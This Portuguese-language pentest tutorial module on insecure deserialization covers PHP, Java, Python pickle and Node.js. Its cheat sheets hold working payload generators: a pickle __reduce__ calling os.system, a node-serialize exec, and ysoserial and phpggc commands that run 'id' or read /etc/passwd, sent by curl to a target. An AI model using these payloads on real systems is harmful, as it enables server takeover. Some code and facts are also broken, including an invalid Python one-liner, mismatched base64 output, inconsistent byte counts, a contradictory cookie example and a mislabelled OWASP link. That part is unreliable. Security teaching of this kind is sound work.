# 🔓 10. Insecure Deserialization — Deserialização Insegura

> Serializar objetos é como empacotar dados para transportar. Se o servidor desempacota sem verificar, você pode colocar explosivos no pacote.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 60min | ⭐⭐⭐ Avançado | `ysoserial, phpggc, curl` |

</div>

---

## 🎓 Por que isso importa?

Deserialization é o processo de converter dados serializados (JSON, XML, PHP, Java) de volta em objetos. Quando a aplicação deserializa **input do usuário sem validação**, o atacante pode injetar código malicioso que é executado durante a deserialização.

**Analogia:** Imagine que você recebe uma caixa selada. Você abre e executa o que está dentro sem olhar. Se alguém colocou veneno dentro, você executa sem saber.

**Impacto real:**
- **RCE direto** — executar comandos arbitrários no servidor
- **Privilege escalation** — assumir controle do servidor
- **Bypass de autenticação** — forjar tokens de sessão
- **DoS** — consumir recursos do servidor

**OWASP 2025:** Mapeado em **A08:2025 Software/Data Integrity Failures**

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| HTTP basics | Sim | Módulo 00 |
| Burp Suite (Repeater) | Sim | Arquivo 01 deste módulo |
| O que é serialização (PHP, Java) | Sim | Este arquivo explica |

---

## 🎯 Quando testar Insecure Deserialization

- Quando a app usa **cookies serializados** (PHP, Java)
- Quando existem **tokens opacos** que parecem serializados
- Para APIs que usam **XML/JSON serializado** como autenticação
- Quando o servidor retorna **objetos serializados** em responses

---

## 🔄 Como funciona na prática

```
┌──────────────┐         ┌──────────────────┐
│   Atacante   │ ──data─►│   App Web        │
│  (payload    │         │  (deserializa)   │
│   malicioso) │         │                  │
└──────────────┘         └──────────────────┘
                                │
                                ▼
                         ┌──────────────┐
                         │  Executa     │
                         │  código do   │
                         │  payload     │
                         └──────────────┘
                                │
                                ▼
                         ┌──────────────┐
                         │  RCE / DoS   │
                         │  no servidor  │
                         └──────────────┘
```

---

## 📝 Deserialization por Linguagem

### PHP (Funções perigosas)

```php
# Funções que causam deserialização:
unserialize()    ← mais perigosa
eval()
preg_replace() com /e modifier
create_function()
call_user_func()
```

### PHP Object Injection (Gadgets)

```bash
# Um "gadget" é uma classe PHP que, ao ser deserializada,
# executa código indiretamente via __destruct ou __wakeup

# Exemplo de gadget chain simples:
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

# Gadget chain para RCE (via phpggc):
phpggc monolog/rce1 system 'id'
# Output: O:32:"Monolog\Handler\SyslogHandler":2:{...}
```

### Java (Deserialization)

```java
# Java deserialization é RCE quase garantido
# payloads: ysoserial

# Exemplo de payload Java serialized:
AC ED 00 05  (magic bytes Java serialized)
73 72 00 ... (classe + gadget chain)

# Ferramenta: ysoserial
java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin
```

### Python (Pickle)

```python
# Python pickle é RCE se deserializado
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
# Output: b'\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x06os\x82\x94\x8c\x06system\x94\x8c\x02id\x94\x85\x94.'
```

### Node.js

```javascript
// Node.js serialize
const serialize = require('node-serialize');
const payload = serialize.serialize({
  rce: function() { require('child_process').exec('id'); }
});
// Output: {"rce":"_$$ND_FUNC$$_function() { require('child_process').exec('id'); }"}
```

---

## 🛠️ Ferramentas

### ysoserial (Java)

```bash
# Instalar
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
mvn clean package -DskipTests

# Usar
java -jar ysoserial.jar [gadget] '[command]'
java -jar ysoserial.jar CommonsCollections1 'id'
java -jar ysoserial.jar CommonsCollections5 'cat /etc/passwd'

# Gadget chains disponíveis:
java -jar ysoserial.jar  # lista todas
```

### phpggc (PHP)

```bash
# Instalar
git clone https://github.com/ambionics/phpggc.git
cd phpggc
# phpggc não precisa de compilação

# Usar
phpggc [framework/gadget] '[command]'
phpggc monolog/rce1 system 'id'
phpggc laravel/rce1 system 'id'
phpggc codeigniter/rce1 system 'id'

# Listar gadgets disponíveis
phpggc -l
```

### SerialPhisher (Python)

```bash
# Para Python pickle deserialization
pip install serialphisher

# Ou manualmente:
python3 -c "import pickle,os; class E: __reduce__=lambda s:(os.system,('id',));print(pickle.dumps(E()))"
```

---

## 📝 Exemplos Práticos

### Exemplo 1: PHP Object Injection

```bash
# 1. Identificar cookie serializado
Cookie: user=O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

# 2. Decodificar (PHP serialize format)
# O:4:"User" = Object, 4 chars, class "User"
# :2:{...} = 2 propriedades
# s:4:"name" = string, 4 chars, "name"
# s:5:"admin" = string, 5 chars, "admin"

# 3. Modificar propriedade (privilege escalation)
# Trocar "role": "user" por "role": "admin"

# 4. Enviar via Burp Repeater
Cookie: user=O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

# 5. Se a app deserializa sem validação → acesso admin
```

### Exemplo 2: PHP RCE via phpggc

```bash
# Gerar payload para RCE
phpggc monolog/rce1 system 'id'
# Output: O:29:"Monolog\Handler\SyslogHandler":2:{s:7:"...";s:...}

# Injetar em cookie ou parâmetro
curl -H "Cookie: data=O:29:..." http://target.com/dashboard

# Output esperado: uid=33(www-data) gid=33(www-data)
```

### Exemplo 3: Java RCE via ysoserial

```bash
# Gerar payload Java serialized
java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin

# Enviar via POST
curl -X POST http://target.com/api/process \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.bin

# Ou via header serializado
curl -X GET http://target.com/api/data \
  -H "Authorization: serialized_payload_here"

# Output: uid=0(root) gid=0(root)
```

### Exemplo 4: Python Pickle RCE

```bash
# Gerar payload pickle
python3 -c "
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
"

# Output: gASVBgAAAAAAAACMCG9zLnN5c3RlbKhzlIwCaWSR

# Enviar
curl -X POST http://target.com/api/data \
  -H "Content-Type: application/octet-stream" \
  -d 'gASVBgAAAAAAAACMCG9zLnN5c33T'
```

### Exemplo 5: Detecção via Burp

```bash
# 1. Interceptar response que contém dado serializado
# 2. Identificar padrões:
#    PHP: O:4:"User":2:{...}
#    Java: \xac\xed\x00\x05 (magic bytes)
#    Python: \x80\x04\x95 (pickle protocol 4)
#    Node.js: _$$ND_FUNC$$_

# 3. Modificar dados serializados
# 4. Enviar de volta ao servidor
# 5. Observar se servidor executa código
```

---

## 📋 Identificação de Serialização

| Formato | Magic Bytes / Padrão | Ferramenta |
|---------|---------------------|------------|
| PHP | `O:4:"`, `a:2:{` | Manual |
| Java | `\xac\xed\x00\x05` | SerialKiller |
| Python | `\x80\x04\x95` | Manual |
| Node.js | `_$$ND_FUNC$$_` | Manual |
| .NET | `\x00\x01\x00\x00` | Manual |

---

## 🔄 Fluxo de Teste

```
┌─────────────────────────────────────────────────────────┐
│  1. IDENTIFICAR SERIALIZAÇÃO                             │
│     - Procurar tokens opacos em cookies/headers          │
│     - Identificar padrão (PHP O:, Java \xac\xed)        │
│     - Analisar application/octet-stream responses        │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  2. DESESTRUTURAR DADOS                                  │
│     - Decodificar Base64 se necessário                   │
│     - Identificar classe e propriedades                  │
│     - Mapear propriedades manipuláveis                   │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  3. MODIFICAR DADOS                                      │
│     - PHP: trocar propriedades (role: user → admin)      │
│     - Java: gerar payload com ysoserial                  │
│     - Python: gerar payload pickle                       │
│     - Node.js: injetar _$$ND_FUNC$$_                    │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  4. INJETAR E VALIDAR                                    │
│     - Enviar payload modificado                          │
│     - Verificar se código é executado                    │
│     - Escalar para RCE completo                          │
└─────────────────────────────────────────────────────────┘
```

---

## ❌ Erros Comuns

| Erro | Solução |
|------|---------|
| "Não sei se é serializado" | Procurar padrões: O:4:" (PHP), \xac\xed (Java), \x80\x04 (Python) |
| "Payload não funciona" | Gadget chain pode não existir no servidor → tentar outras |
| "ysoserial falha" | Versão da library pode ser diferente → testar múltiplos gadgets |
| "PHP bloqueia unserialize" | Verificar se há validação de classe → testar types diferentes |
| "Não vejo efeito" | Pode ser blind → verificar logs, timing, ou usar out-of-band |

---

## 📋 Cheat Sheet Rápido

### PHP — Gadget Comuns

```bash
phpggc monolog/rce1 system 'id'
phpggc monolog/rce1 system 'cat /etc/passwd'
phpggc laravel/rce1 system 'id'
phpggc codeigniter/rce1 system 'id'
phpggc wordpress/rce1 system 'id'
```

### Java — ysoserial

```bash
java -jar ysoserial.jar CommonsCollections1 'id'
java -jar ysoserial.jar CommonsCollections5 'cat /etc/passwd'
java -jar ysoserial.jar Spring1 'id'
java -jar ysoserial.jar Groovy1 'id'
```

### Python — Pickle

```bash
python3 -c "import pickle,os;class E:__reduce__=lambda s:(os.system,('id',));print(pickle.dumps(E()))"
```

### Identificação Rápida

```
PHP:    O:4:"User"  ou  a:2:{s:4:...
Java:   \xac\xed\x00\x05
Python: \x80\x04\x95
Node:   _$$ND_FUNC$$_
```

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | Tópicos | Tempo |
|---|:----------:|:----|:--------|:-----:|
| 1 | PortSwigger | [Modifying serialized objects](https://portswigger.net/web-security/deserialization/exploiting/lab-modifying-serialized-objects) | PHP object injection | 15min |
| 2 | PortSwigger | [Modifying serialized objects with built-in methods](https://portswigger.net/web-security/deserialization/exploiting/lab-modifying-serialized-objects-with-built-in-methods) | Magic methods | 15min |
| 3 | PortSwigger | [Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-exploiting-java-deserialization-with-apache-commons) | Java ysoserial | 20min |
| 4 | PortSwigger | [Exploiting PHP deserialization with a constructed gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-exploiting-php-deserialization-with-a-constructed-gadget-chain) | PHP gadget chain | 25min |
| 5 | PortSwigger | [Exploiting unsafe deserialization of DOM objects](https://portswigger.net/web-security/deserialization/exploiting/lab-exploiting-unsafe-deserialization-of-dom-objects) | Node.js DOM | 20min |

---

## 📚 Referências

- [PortSwigger — Insecure Deserialization](https://portswigger.net/web-security/deserialization)
- [PortSwigger — Deserialization Labs](https://portswigger.net/web-security/deserialization/exploiting)
- [OWASP — Deserialization](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Parameter_Pollution)
- [HackTricks — Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization)
- [ysoserial — Java deserialization](https://github.com/frohoff/ysoserial)
- [phpggc — PHP deserialization](https://github.com/ambionics/phpggc)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Identificar dados serializados em cookies e headers
- [ ] Decodificar e entender formatos de serialização (PHP, Java, Python)
- [ ] Gerar payloads com ysoserial para Java
- [ ] Gerar payloads com phpggc para PHP
- [ ] Criar payloads Python pickle manualmente
- [ ] Modificar objetos serializados para privilege escalation
- [ ] Executar RCE via deserialization insegura
- [ ] Detectar magic bytes de serialização em responses
- [ ] Completar os labs PortSwigger de deserialization
